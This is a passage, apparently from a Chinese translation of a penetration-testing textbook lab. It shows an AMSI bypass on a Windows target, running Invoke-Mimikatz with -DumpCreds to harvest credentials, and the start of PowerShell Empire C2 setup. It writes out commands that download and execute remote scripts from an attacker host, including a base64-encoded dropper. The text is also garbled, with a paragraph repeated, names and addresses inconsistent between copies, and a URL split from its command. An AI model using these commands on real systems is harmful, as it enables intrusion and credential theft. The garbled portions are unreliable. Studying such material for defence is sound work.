
+ FullyQualifiedErrorCode : ScriptContainedMaliciousContent

我们可以从错误信息看出 Windows 检测到脚本具有恶意并阻止了它。脚本仅存在于内存中，这里发生了什么？Windows 反恶意软件扫描接口 `AMSI` 正在查看 PowerShell 脚本的内容并判断其是否具有恶意。我们有几种处理方法：我们尝试不同的工具，或者以某种方式混淆代码使其不再被检测，或者禁用 `AMSI`。对于

在这个示例中，让我们尝试禁用 `AMSI`。在我们的 Kali 机器上，已经有一个名为 `amsi.ps1` 的脚本，位于 Kali 用户的家目录。让我们尝试运行它，看看我们是否可以执行该脚本：

```
PS C:\Users\target> iex (iwr -UseParsing http://10.0.0.40:8080/amsi.ps1)
```

```
-- AMSI Patch

-- Modified By: Shantanu Khandelwal (@shantukhandake)

-- Original Author: Paul Lauria (@amnosec)
```

```
[+] 64-bits process

[+] AMSI DLL Handle: 140731664891904

[+] DlGetObject address: 140731664891922

[+] Targeted address: 1407316648904992

PS C:\Users\target> iex (iwr -UseParsing)
```

```
http://10.0.0.40:8080/ps/Exfiltration/Invoke-Mimikatz.ps1

PS C:\Users\target>
```

`AMSI` 绕过成功了！在这种情况下，我们看到它成功加载了脚本。从这里，我们可以尝试运行 `Invoke-Mimikatz` 并看看我们是否可以获取凭据：

```
PS C:\Users\target> Invoke-Mimikatz
Exception calling "GetMethod" with "1" argument (s): "Ambiguous match found."
At line:886 char:6
  $GetProcAddress = UnsafeNativeMethods.GetMethod('GetProcAddr ...
-------------------------------------------------------
  + CategoryInfo : NotSpecified: (:) [], MethodInvocationException
  + FullyQualifiedErrorCode : AmbiguousMatchException
```

这次我们又进了一步，但脚本报错了。PowerSplat 的缺点之一是它没有没有维护。一段时间以来，GitHub 仓库中出现了许多更新请求。其中一个就位于 Kali 家目录下的 `Invoke-Mimikatz.ps1` 脚本。让我们尝试另一个版本：

```
PS C:\> iex (iwr -UseParsing http://10.0.0.40:8080/Invoke-Mimikatz.ps1)
PS C:\> Invoke-Mimikatz -DumpCreds
```

##### mimikatz 2.2.0 (x64) Oct 30 2019 13:01:25
## "A La L'Amour" - (oe.eo)
## Benjamin DELPY 'gentkilwi' ( benjamin@gentkilwi.com )
## > http://blog.gentkilwi.com/mimikatz
Vincent L TOUX (vincent.letoux@gmail.com )
## > http://pingcastle.com / http://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::loginpasswords
ERROR kuhl_m_sekursa_acquireLSA : Handle on memory (0x00000005)

mimikatz(powershell) # exit

Bye!

```
PS C:\>
C:\>
```

它运行了，但存在几个问题。我们首先注意到没有凭据。这是因为该用户受到用户账户控制 `UAC` 的限制，且用户没有在提升权限的 shell 中运行。我们注意的第二点是 PowerShell 因为某些原因退出了。当我们关注 Windows Defender 告报时，我们看到 Defender 检测到了恶意活动并杀掉了我们的进程。如果我们处于提升权限的进程中，此脚本将会运行，但由于我们不是，我们需要弄清楚如何获取特权 shell。由于我们处于控制台，我们可以直接请求“以管理员身份运行”，但如果我们在远程会话中，就无法这样做。

# 使用 PowerShell Empire 进行 C2

能够运行单个脚本很不错，但拥有一个用于远程交互 PowerShell 的全面框架对于实战攻防效果更好。这就是 Empire 发挥用场的地方。Empire 为我们提供了包含模块的框架以及 PowerShellSploit 的功能。

它还遵循可自定义的信标 `beaconing` 方法，因此你可以更好地隐藏与命令和控制 `C2` 的交互。在本节中，我们将设置一个基础 `C2`、提升权限并在 Empire 中添加持久化。

## 实验 15-7：设置 Empire

原始的 PowerShell Empire 已被遗弃，但 BC Security 接手了该项目，将其移植到 Python3 并继续更新。这是 Kali 附带的版本。因为我们需要使用 80 和 443 端口，我们需要确保其他服务没有在这些端口上运行，然后使用 `sudo` 启动 PowerShell。

```
sudo netstat -anlp | grep LISTEN | grep -e 80 -e 443
tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN
4102/nginx: master
tcp6 0 0 ::80 ::: LISTEN
4102/nginx: master
unix 2 [ ACC ] STREAM LISTENING 16080 715/nmbd
/var/run/nmbd
```

我们首先注意到没有凭据。这是因为该用户受到用户账户控制 `UAC` 的限制，且用户没有在提升权限的 shell 中运行。我们注意的第二点是 PowerShell 因为某些原因退出了。当我们关注 Windows Defender 告报时，我们看到 Defender 检测到了恶意活动并杀掉了我们的进程。如果我们处于提升权限的进程中，此脚本将会运行，但由于我们不是，我们需要弄清楚如何获取特权 shell。由于我们处于控制台，我们可以直接请求“以管理员身份运行”，但如果我们在远程会话中，就无法这样做。

```powershell
PS C:\Users\target> iex (iwr -UseBasicParsing http://10.0.0.40:8080/amsi.ps1)
-- AMSI Patch
-- Modified By Shantanu Khandel (@shantanukhande)
-- Original Author: Paul Neumann (@amonsec)
[+] 64-bits process
[+] AMSI DLL Handle address: 14073166489194
[+] GetToObject address: 14073166489192
[+] Targeted address: 14073166490492
PS C:\Users\target> $a = iwr -UseBasicParsing http://10.0.0.40:8080/dropper
PS C:\Users\target> $b = [System.Convert]::FromBase64String($a)
PS C:\Users\target> iex ([System.Text.Encoding]::Unicode.GetString($b))
```
